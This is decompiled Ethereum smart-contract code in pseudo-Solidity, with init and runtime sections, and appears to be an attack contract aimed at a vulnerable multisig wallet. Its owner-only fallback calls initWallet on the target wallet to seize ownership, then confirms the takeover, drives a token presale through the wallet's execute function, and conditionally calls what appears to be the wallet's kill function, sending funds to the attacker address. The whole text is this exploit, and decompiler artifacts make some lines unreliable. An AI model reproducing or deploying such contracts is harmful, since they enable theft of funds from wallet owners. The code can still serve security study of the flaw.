contract main {


// =======================  Init code  ======================


address stor0;
address stor1;
address stor2;
array of uint256 stor3;
address stor4;
address stor5;
array of address stor6;

function _fallback() payable {
    stor0 = 0xb0719bdac19fd64438450d3b5aedd3a4f100cba6
    stor1 = 0xf199af8b17d81c41abe6220a1d7c9fe04d0d9d2c
    stor2 = 0x63c0f17c1f72e1315e3d4f8a89a37d95f1314793
    bool(stor3.length) = 0
    stor3.length.field_1 = 4
    stor3.length.field_224 = endPreSale()
    idx = 0
    while stor3.length + 31 / 32 > idx:
        stor3[idx].field_0 = 0
        idx = idx + 1
        continue 
    stor4 = stor2
    stor5 = stor1
    require not msg.value
    stor6.length++
    if not stor6.length <= stor6.length + 1:
        idx = stor6.length + 1
        while stor6.length > idx:
            uint256(stor6[idx]) = 0
            idx = idx + 1
            continue 
    address(stor6[stor6.length]) = this.address
    return code.data[874 len 1984]
}



// =====================  Runtime code  =====================


address stor0;
address stor2;
array of struct stor3;
address stor4;
address stor5;
array of struct stor6;

function kill() {
    require msg.sender == stor0
    selfdestruct(stor0)
}

function _fallback() payable {
    require msg.sender == stor0
    if not stor6.length:
        require ext_code.size(stor5)
        call stor5.initWallet(address[] rg1, uint256 rg2, uint256 rg3) with:
             gas gas_remaining - 710 wei
            args 0, 96, 1, 0, stor6.length
    else:
        mem[228] = address(stor6.field_0)
        idx = 228
        s = 0
        while (32 * stor6.length) + 228 > idx + 32:
            mem[idx + 32] = stor6[s].field_256
            idx = idx + 32
            s = s + 1
            continue 
        require ext_code.size(stor5)
        call stor5.initWallet(address[] rg1, uint256 rg2, uint256 rg3) with:
             gas gas_remaining - 710 wei
            args 0, 96, 1, 0, stor6.length, mem[228 len 32 * stor6.length]
    require ext_call.success
    require ext_code.size(stor5)
    call stor5.0x2f54bf6e with:
         gas gas_remaining - 710 wei
        args this.address
    require ext_call.success
    require ext_call.return_data[0]
    require ext_code.size(stor4)
    call stor4.0x18160ddd with:
         gas gas_remaining - 710 wei
    require ext_call.success
    call stor4 with:
       value -ext_call.return_data[0] + 13000000 * 10^18 / 1300 wei
         gas gas_remaining - 34710 wei
    mem[228] = uint256(stor3.field_0)
    idx = 228
    s = 0
    while stor3.length + 228 > idx + 32:
        mem[idx + 32] = stor3[s].field_256
        idx = idx + 32
        s = s + 1
        continue 
    require ext_code.size(stor5)
    call stor5.0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args stor2, 0, 96, stor3.length, mem[228 len stor3.length + (floor32(stor3.length - 1) + -stor3.length + 32 % 32)]
    require ext_call.success
    if not eth.balance(stor4):
        require ext_code.size(stor5)
        call stor5.0xcbf0b0c0 with:
             gas gas_remaining - 710 wei
            args stor0
        require ext_call.success
        if not eth.balance(stor5):
    revert
}



}
